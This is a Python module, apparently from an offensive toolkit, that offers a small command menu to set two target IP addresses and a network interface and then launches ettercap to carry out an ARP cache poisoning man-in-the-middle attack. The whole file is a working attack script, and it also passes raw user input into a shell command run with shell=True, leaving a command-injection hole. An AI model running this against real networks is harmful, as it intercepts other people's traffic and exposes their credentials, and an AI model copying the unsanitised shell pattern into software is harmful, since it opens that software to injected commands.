import os
import subprocess
import readline

from colorama import init as colorama_init
from colorama import Fore
from colorama import Style

options = ["192.168.1.1", "192.168.1.2", "eth0"]
def arp_spoof():
	try:
		pmt0 = f"{Fore.GREEN}plv{Fore.BLUE}/net/arp_poison>{Style.RESET_ALL}"
		cmd = input(pmt0).lower()
		if(cmd[0:12]=='show options'):
			print('\nARP Spoofing options:')
			print('--------------------------------')
			print('TARGET1  ===>  ' + options[0] + '  |  Target 1 of the MiTM attack')
			print('TARGET2  ===>  ' + options[1] + '  |  Target 2 of the MiTM attack')
			print('IFACE    ===>  ' + options[2] + '  |  Net interface for spoofing\n')
		elif(cmd[0:3]=='set'):
			if(cmd[4:11]=='target1'):
				options[0] = cmd[12:26]
				print('\nTARGET1   ===>  ' + options[0] + '\n')
			elif(cmd[4:11]=='target2'):
				options[1] = cmd[12:26]
				print('\nTARGET2   ===>  ' + options[1] + '\n')
			elif(cmd[4:9]=='iface'):
				options[2] = cmd[10:24]
				print('\nIFACE   ===>  ' + options[2] + '\n')
			else:
				print('\nUnknown option!\n')	
		elif(cmd[0:3]=='run' or cmd[0:7]=='execute'):
			shell0="ettercap -M arp:remote -T -i %s /%s// /%s//" % (options[2], options[0], options[1])
			print(f"{Fore.RED}ARP cache poisoning MiTM attack started!{Style.RESET_ALL}")
			subprocess.Popen(shell0, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
		
		elif(cmd[0:4]=='exit'):
			print("\nGood luck, Plova!\n")
			exit(0)
		else:
			print("\nUnknown command! Available options:\nshow options\nset [option] [value]\nexit\nrun\n")
		arp_spoof()
	except(KeyboardInterrupt):
		print("\nExiting module...\n")
